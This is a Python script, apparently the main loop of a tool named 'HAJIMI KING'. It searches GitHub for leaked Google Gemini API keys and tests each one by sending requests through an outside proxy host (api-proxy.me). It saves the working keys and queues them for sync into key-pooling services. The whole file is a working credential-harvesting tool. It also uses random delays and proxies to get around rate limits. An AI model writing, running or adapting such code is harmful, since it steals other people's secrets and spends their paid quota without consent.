import random
import re
import sys
import time
import traceback
from datetime import datetime, timedelta
from typing import Dict, List, Union, Any

from google.api_core import exceptions as google_exceptions

from common.Logger import logger

sys.path.append("../")
from common.config import Config
from utils.github_client import GitHubClient
from utils.file_manager import file_manager, Checkpoint, checkpoint
from utils.sync_utils import sync_utils

# 创建GitHub工具实例和文件管理器
github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)

# 统计信息
skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}


def normalize_query(query: str) -> str:
    query = " ".join(query.split())

    parts = []
    i = 0
    while i < len(query):
        if query[i] == '"':
            end_quote = query.find('"', i + 1)
            if end_quote != -1:
                parts.append(query[i : end_quote + 1])
                i = end_quote + 1
            else:
                parts.append(query[i])
                i += 1
        elif query[i] == " ":
            i += 1
        else:
            start = i
            while i < len(query) and query[i] != " ":
                i += 1
            parts.append(query[start:i])

    quoted_strings = []
    language_parts = []
    filename_parts = []
    path_parts = []
    other_parts = []

    for part in parts:
        if part.startswith('"') and part.endswith('"'):
            quoted_strings.append(part)
        elif part.startswith("language:"):
            language_parts.append(part)
        elif part.startswith("filename:"):
            filename_parts.append(part)
        elif part.startswith("path:"):
            path_parts.append(part)
        elif part.strip():
            other_parts.append(part)

    normalized_parts = []
    normalized_parts.extend(sorted(quoted_strings))
    normalized_parts.extend(sorted(other_parts))
    normalized_parts.extend(sorted(language_parts))
    normalized_parts.extend(sorted(filename_parts))
    normalized_parts.extend(sorted(path_parts))

    return " ".join(normalized_parts)


def extract_keys_from_content(content: str) -> List[str]:
    pattern = r"(AIzaSy[A-Za-z0-9\-_]{33})"
    return re.findall(pattern, content)


def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool, str]:
    """
    检查是否应该跳过处理此item

    Returns:
        tuple: (should_skip, reason)
    """
    # 检查增量扫描时间
    if checkpoint.last_scan_time:
        try:
            last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)
            repo_pushed_at = item["repository"].get("pushed_at")
            if repo_pushed_at:
                repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                if repo_pushed_dt <= last_scan_dt:
                    skip_stats["time_filter"] += 1
                    return True, "time_filter"
        except Exception:
            pass

    # 检查SHA是否已扫描
    if item.get("sha") in checkpoint.scanned_shas:
        skip_stats["sha_duplicate"] += 1
        return True, "sha_duplicate"

    # 检查仓库年龄
    repo_pushed_at = item["repository"].get("pushed_at")
    if repo_pushed_at:
        repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
        if repo_pushed_dt < datetime.utcnow() - timedelta(days=Config.DATE_RANGE_DAYS):
            skip_stats["age_filter"] += 1
            return True, "age_filter"

    # 检查文档和示例文件
    lowercase_path = item["path"].lower()
    if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):
        skip_stats["doc_filter"] += 1
        return True, "doc_filter"

    return False, ""


def process_item(item: Dict[str, Any]) -> tuple:
    """
    处理单个GitHub搜索结果item

    Returns:
        tuple: (valid_keys_count, rate_limited_keys_count)
    """
    delay = random.uniform(1, 4)
    file_url = item["html_url"]

    # 简化日志输出，只显示关键信息
    repo_name = item["repository"]["full_name"]
    file_path = item["path"]
    time.sleep(delay)

    content = github_utils.get_file_content(item)
    if not content:
        logger.warning(f"⚠️ Failed to fetch content for file: {file_url}")
        return 0, 0

    keys = extract_keys_from_content(content)

    # 过滤占位符密钥
    filtered_keys = []
    for key in keys:
        context_index = content.find(key)
        if context_index != -1:
            snippet = content[context_index : context_index + 45]
            if "..." in snippet or "YOUR_" in snippet.upper():
                continue
        filtered_keys.append(key)

    # 去重处理
    keys = list(set(filtered_keys))

    if not keys:
        return 0, 0

    logger.info(f"🔑 Found {len(keys)} suspected key(s), validating...")

    valid_keys = []
    rate_limited_keys = []

    # 验证每个密钥
    for key in keys:
        validation_result = validate_gemini_key(key)
        if validation_result and "ok" in validation_result:
            valid_keys.append(key)
            logger.info(f"✅ VALID: {key}")
        elif validation_result == "rate_limited":
            rate_limited_keys.append(key)
            logger.warning(f"⚠️ RATE LIMITED: {key}, check result: {validation_result}")
        else:
            logger.info(f"❌ INVALID: {key}, check result: {validation_result}")

    # 保存结果
    if valid_keys:
        file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
        logger.info(f"💾 Saved {len(valid_keys)} valid key(s)")
        # 添加到同步队列（不阻塞主流程）
        try:
            # 添加到两个队列
            sync_utils.add_keys_to_queue(valid_keys)
            logger.info(f"📥 Added {len(valid_keys)} key(s) to sync queues")
        except Exception as e:
            logger.error(f"📥 Error adding keys to sync queues: {e}")

    if rate_limited_keys:
        file_manager.save_rate_limited_keys(
            repo_name, file_path, file_url, rate_limited_keys
        )
        logger.info(f"💾 Saved {len(rate_limited_keys)} rate limited key(s)")

    return len(valid_keys), len(rate_limited_keys)


def validate_gemini_key(api_key: str) -> Union[bool, str]:
    try:
        time.sleep(random.uniform(0.5, 1.5))

        def call_gemini_with_custom_base_url(
            api_key, model, prompt, base_url="https://api-proxy.me/gemini"
        ):
            import requests

            url = f"{base_url}/v1beta/models/{model}:generateContent"

            headers = {"Content-Type": "application/json", "x-goog-api-key": api_key}

            data = {"contents": [{"parts": [{"text": prompt}]}]}

            response = requests.post(url, headers=headers, json=data)
            return response.json()

        model_name = Config.HAJIMI_CHECK_MODEL

        response = call_gemini_with_custom_base_url(
            api_key, model_name, "Hello, how are you?"
        )

        if response.get("code", 200) != 200:
            return response.get("message", "Unknown error")

        if response.get("modelVersion") == model_name:
            return "ok"

        return "Unknown error"
    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated):
        return "not_authorized_key"
    except google_exceptions.TooManyRequests:
        return "rate_limited"
    except Exception as e:
        if (
            "429" in str(e)
            or "rate limit" in str(e).lower()
            or "quota" in str(e).lower()
        ):
            return "rate_limited:429"
        elif (
            "403" in str(e)
            or "SERVICE_DISABLED" in str(e)
            or "API has not been used" in str(e)
        ):
            return "disabled"
        else:
            return f"error:{e.__class__.__name__}"


def print_skip_stats():
    """打印跳过统计信息"""
    total_skipped = sum(skip_stats.values())
    if total_skipped > 0:
        logger.info(
            f"📊 Skipped {total_skipped} items - Time: {skip_stats['time_filter']}, Duplicate: {skip_stats['sha_duplicate']}, Age: {skip_stats['age_filter']}, Docs: {skip_stats['doc_filter']}"
        )


def reset_skip_stats():
    """重置跳过统计"""
    global skip_stats
    skip_stats = {
        "time_filter": 0,
        "sha_duplicate": 0,
        "age_filter": 0,
        "doc_filter": 0,
    }


def process_query(query: str) -> dict[str, Any] | None:
    reset_skip_stats()

    query_count = 0
    loop_processed_files = 0
    query_valid_keys = 0
    query_rate_limited_keys = 0

    normalized_q = normalize_query(query)
    if normalized_q in checkpoint.processed_queries:
        logger.info(f"🔍 Skipping already processed query: [{query}]")
        return None

    res = github_utils.search_for_keys(query)
    items = res.get("items", [])
    total_count = res.get("total_count", 0)

    if res and "items" in res:
        if items:
            query_processed = 0

            for item_index, item in enumerate(items, 1):
                # 每20个item保存checkpoint并显示进度
                if item_index % 20 == 0:
                    logger.info(
                        f"📈 Progress: {item_index}/{len(items)} | query: {query} | current valid: {query_valid_keys} | current rate limited: {query_rate_limited_keys} | keys valid: {query_valid_keys} | keys rate limited: {query_rate_limited_keys}"
                    )
                    file_manager.save_checkpoint(checkpoint)
                    file_manager.update_dynamic_filenames()

                # 检查是否应该跳过此item
                should_skip, skip_reason = should_skip_item(item, checkpoint)
                if should_skip:
                    logger.info(
                        f"🚫 Skipping item,name: {item.get('path', '').lower()},index:{item_index} - reason: {skip_reason}"
                    )
                    return None

                # 处理单个item
                valid_count, rate_limited_count = process_item(item)

                query_valid_keys += valid_count
                query_rate_limited_keys += rate_limited_count
                query_processed += 1

                # 记录已扫描的SHA
                checkpoint.add_scanned_sha(item.get("sha"))

                loop_processed_files += 1

            # total_keys_found += query_valid_keys
            # total_rate_limited_keys += query_rate_limited_keys

            if query_processed > 0:
                logger.info(
                    f"✅ Query [{query}] complete - Processed: {query_processed}, Valid: +{query_valid_keys}, Rate limited: +{query_rate_limited_keys}"
                )
            else:
                logger.info(f"⏭️ Query [{query}] complete - All items skipped")

            print_skip_stats()
        else:
            logger.info(f"📭 Query [{query}] - No items found")
    else:
        logger.warning(f"❌ Query [{query}] failed")

    checkpoint.add_processed_query(normalized_q)
    query_count += 1

    checkpoint.update_scan_time()
    file_manager.save_checkpoint(checkpoint)
    file_manager.update_dynamic_filenames()

    if query_count % 5 == 0:
        logger.info(f"⏸️ Processed {query_count} queries, taking a break...")
        time.sleep(5)

    logger.info("💤 Sleeping for 10 seconds...")
    time.sleep(10)

    # 超过1000条查询限制时，拆分子查询
    if total_count > 10 * 1000 and "AIzaSy" in query:
        logger.info(
            f"⚠️ Query too large: {query[:50]}..., splitting into multiple queries"
        )

        def _extract_first_keys_from_content(content: str) -> str:
            keys = _extract_keys_from_content(content)
            return keys[0] if keys else None

        def _extract_keys_from_content(content: str) -> List[str]:
            pattern = r"(AIzaSy[A-Za-z0-9\-_]{0,33})"
            return re.findall(pattern, content)

        def get_random_char(count=10) -> list[str]:
            """
            从 A-Za-z0-9\-_ 中随机取一个字符

            Args:
                count (int): 需要获取的字符数量，默认为10

            Returns:
                list[str]: 包含不重复随机字符的列表
            """
            char_set = (
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
            )

            # 使用random.sample一次性获取多个不重复的字符
            return random.sample(char_set, count)

        # 提取当前查询条件中的密钥
        raw_key = _extract_first_keys_from_content(query)

        for suffix in get_random_char(10):
            new_key = raw_key + suffix
            new_query = query.replace(raw_key, new_key)

            sub_query_result = process_query(new_query)

            if sub_query_result:
                query_valid_keys += sub_query_result["query_valid_keys"]
                query_rate_limited_keys += sub_query_result["query_rate_limited_keys"]

        pass

    return {
        "query_valid_keys": query_valid_keys,
        "query_rate_limited_keys": query_rate_limited_keys,
    }


def main():
    start_time = datetime.now()

    # 打印系统启动信息
    logger.info("=" * 60)
    logger.info("🚀 HAJIMI KING STARTING")
    logger.info("=" * 60)
    logger.info(f"⏰ Started at: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")

    # 1. 检查配置
    if not Config.check():
        logger.info("❌ Config check failed. Exiting...")
        sys.exit(1)
    # 2. 检查文件管理器
    if not file_manager.check():
        logger.error("❌ FileManager check failed. Exiting...")
        sys.exit(1)

    # 2.5. 显示SyncUtils状态和队列信息
    if sync_utils.balancer_enabled:
        logger.info("🔗 SyncUtils ready for async key syncing")

    # 显示队列状态
    balancer_queue_count = len(checkpoint.wait_send_balancer)
    gpt_load_queue_count = len(checkpoint.wait_send_gpt_load)
    logger.info(
        f"📊 Queue status - Balancer: {balancer_queue_count}, GPT Load: {gpt_load_queue_count}"
    )

    # 3. 显示系统信息
    search_queries = file_manager.get_search_queries()
    logger.info("📋 SYSTEM INFORMATION:")
    logger.info(f"🔑 GitHub tokens: {len(Config.GITHUB_TOKENS)} configured")
    logger.info(f"🔍 Search queries: {len(search_queries)} loaded")
    logger.info(f"📅 Date filter: {Config.DATE_RANGE_DAYS} days")
    if Config.PROXY_LIST:
        logger.info(f"🌐 Proxy: {len(Config.PROXY_LIST)} proxies configured")

    if checkpoint.last_scan_time:
        logger.info("💾 Checkpoint found - Incremental scan mode")
        logger.info(f"   Last scan: {checkpoint.last_scan_time}")
        logger.info(f"   Scanned files: {len(checkpoint.scanned_shas)}")
        logger.info(f"   Processed queries: {len(checkpoint.processed_queries)}")
    else:
        logger.info("💾 No checkpoint - Full scan mode")

    logger.info("✅ System ready - Starting king")
    logger.info("=" * 60)

    total_keys_found = 0
    total_rate_limited_keys = 0
    loop_count = 0

    while True:
        try:
            loop_count += 1
            logger.info(
                f"🔄 Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}"
            )

            for i, query in enumerate(search_queries, 1):
                query_result = process_query(query)

                if query_result:
                    total_keys_found += query_result.get("query_valid_keys", 0)
                    total_rate_limited_keys += query_result.get(
                        "query_rate_limited_keys", 0
                    )

            logger.info(
                f"🏁 Loop #{loop_count} complete - Processed files | Total valid: {total_keys_found} | Total rate limited: {total_rate_limited_keys}"
            )

            logger.info("💤 Sleeping for 10 seconds...")
            time.sleep(10)

        except KeyboardInterrupt:
            logger.info("⛔ Interrupted by user")
            checkpoint.update_scan_time()
            file_manager.save_checkpoint(checkpoint)
            logger.info(
                f"📊 Final stats - Valid keys: {total_keys_found}, Rate limited: {total_rate_limited_keys}"
            )
            logger.info("🔚 Shutting down sync utils...")
            sync_utils.shutdown()
            break
        except Exception as e:
            logger.error(f"💥 Unexpected error: {e}")
            traceback.print_exc()
            logger.info("🔄 Continuing...")
            continue


if __name__ == "__main__":
    main()
